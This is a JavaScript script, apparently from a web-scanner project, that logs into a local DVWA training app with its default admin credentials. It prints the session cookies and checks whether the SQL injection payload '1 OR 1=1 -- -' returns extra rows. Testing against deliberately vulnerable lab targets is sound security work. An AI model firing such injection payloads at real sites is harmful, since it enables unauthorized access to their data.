const { withBrowser } = require('./src/dast/browser');

async function getFreshSession() {
  await withBrowser(async (manager) => {
    await manager.withPage(async (page) => {
      console.log('Logging into DVWA...');
      
      await page.goto('http://localhost:8080/login.php', { waitUntil: 'domcontentloaded' });
      await page.type('input[name="username"]', 'admin');
      await page.type('input[name="password"]', 'password');
      
      // Find and click the correct login button
      await page.evaluate(() => {
        const loginBtn = document.querySelector('input[name="Login"]') || 
                        document.querySelector('button[type="submit"]') ||
                        document.querySelector('input[type="submit"]');
        if (loginBtn) loginBtn.click();
      });
      
      await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => {});
      
      const cookies = await page.cookies();
      const phpsessid = cookies.find(c => c.name === 'PHPSESSID');
      const security = cookies.find(c => c.name === 'security');
      
      console.log('\n�� Fresh DVWA Session:');
      console.log('PHPSESSID:', phpsessid ? phpsessid.value : 'NOT FOUND');
      console.log('security:', security ? security.value : 'NOT FOUND');
      
      console.log('\nTesting SQLi manually...');
      await page.goto('http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit');
      let content = await page.content();
      let count1 = (content.match(/Surname/gi) || []).length;
      console.log('Normal query (id=1): Surname count =', count1);
      
      await page.goto("http://localhost:8080/vulnerabilities/sqli/?id=1%20OR%201=1%20--%20-&Submit=Submit");
      content = await page.content();
      let count2 = (content.match(/Surname/gi) || []).length;
      console.log('SQLi query (1 OR 1=1): Surname count =', count2);
      
      if (count2 > count1) {
        console.log('\n✅ SQLi works! Cookie:', phpsessid.value);
      } else {
        console.log('\n⚠️  SQLi not detecting difference');
        console.log('Maybe DVWA security is not set to "low" or SQLi page is disabled');
      }
    });
  });
}

getFreshSession();
